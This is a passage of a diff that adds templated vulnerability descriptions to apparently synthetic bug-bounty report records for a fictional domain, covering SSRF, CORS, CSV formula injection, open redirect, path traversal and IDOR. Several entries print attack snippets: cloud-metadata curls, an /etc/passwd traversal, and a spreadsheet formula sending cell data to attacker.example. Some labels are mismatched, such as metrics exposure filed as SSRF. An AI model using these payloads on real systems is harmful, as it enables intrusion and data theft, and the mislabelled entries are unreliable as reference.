+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.felsentor-watchworks.foo/import`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2325,7 +2342,8 @@
           "offset": "2d 23h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.felsentor-watchworks.foo/console/queue`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -2461,7 +2479,8 @@
           "offset": "5d 7h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://shop.felsentor-watchworks.foo/admin/items`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -2589,7 +2608,8 @@
           "offset": "5d 23h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://shop.felsentor-watchworks.foo/admin/queue`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -2676,7 +2696,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://shop.felsentor-watchworks.foo/profile`\n- Preconditions: authenticated user: authenticated user; app version: API v2\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2787,7 +2808,8 @@
           "offset": "0h",
           "message": "Initial report filed with screenshots and logs."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://api.felsentor-watchworks.foo/export?type=records`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -2907,7 +2929,8 @@
           "offset": "4d 3h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.felsentor-watchworks.foo/api/me`\n- Preconditions: authenticated user: radiologist; app version: Auth 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3043,7 +3066,8 @@
           "offset": "4d 10h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.felsentor-watchworks.foo/api/import`\n- Preconditions: authenticated user: unauthenticated; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3169,7 +3193,8 @@
           "offset": "4d 6h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.felsentor-watchworks.foo/api/import`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3288,7 +3313,8 @@
           "offset": "6d 2h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.felsentor-watchworks.foo/export?type=records`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3415,7 +3441,8 @@
           "offset": "3d 11h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.felsentor-watchworks.foo/profile`\n- Preconditions: authenticated user: unauthenticated; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3515,7 +3542,8 @@
           "offset": "1d 14h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://api.felsentor-watchworks.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3636,7 +3664,8 @@
           "offset": "8d",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://shop.felsentor-watchworks.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3737,7 +3766,8 @@
           "offset": "6d 11h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://shop.felsentor-watchworks.foo/profile`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3852,7 +3882,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://shop.felsentor-watchworks.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -3984,7 +4015,8 @@
           "offset": "0h",
           "message": "Initial submission with PoC and reproduction steps."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://api.felsentor-watchworks.foo/api/documents/`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4131,7 +4163,8 @@
           "offset": "5d 10h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://shop.felsentor-watchworks.foo/import`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4210,7 +4243,8 @@
           "offset": "6h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.felsentor-watchworks.foo/api/import`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4353,7 +4387,8 @@
           "offset": "1d 11h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://api.felsentor-watchworks.foo/profile`\n- Preconditions: authenticated user: radiologist; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4496,7 +4531,8 @@
           "offset": "8d 2h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://api.felsentor-watchworks.foo/admin/items`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -4640,7 +4676,8 @@
           "offset": "1d 11h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://shop.felsentor-watchworks.foo/api/documents/`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4807,7 +4844,8 @@
           "offset": "6d 7h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.felsentor-watchworks.foo/profile`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -4935,7 +4973,8 @@
           "offset": "4d 15h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.felsentor-watchworks.foo/api/import`\n- Preconditions: authenticated user: admin; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5025,7 +5064,8 @@
           "offset": "4d 20h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://shop.felsentor-watchworks.foo/admin/items`\n- Preconditions: authenticated user: authenticated user; app version: Service 1.8\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -5181,7 +5221,8 @@
           "offset": "2d 15h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://shop.felsentor-watchworks.foo/profile`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5276,7 +5317,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.felsentor-watchworks.foo/v2/me`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5416,7 +5458,8 @@
           "offset": "3d 2h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.felsentor-watchworks.foo/fetch`\n- Preconditions: authenticated user: radiologist; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5541,7 +5584,8 @@
           "offset": "4d 14h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://shop.felsentor-watchworks.foo/metrics`\n- Preconditions: authenticated user: support agent; app version: Web 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5682,7 +5726,8 @@
           "offset": "7d 1h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://auth.felsentor-watchworks.foo/metrics`\n- Preconditions: authenticated user: radiologist; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -5817,7 +5862,8 @@
           "offset": "3d 18h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://shop.felsentor-watchworks.foo/admin/queue`\n- Preconditions: authenticated user: authenticated user; app version: Mobile 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -5945,7 +5991,8 @@
           "offset": "0h",
           "message": "Minimal PoC attached; scope limited to in-scope assets."
         }
-      ]
+      ],
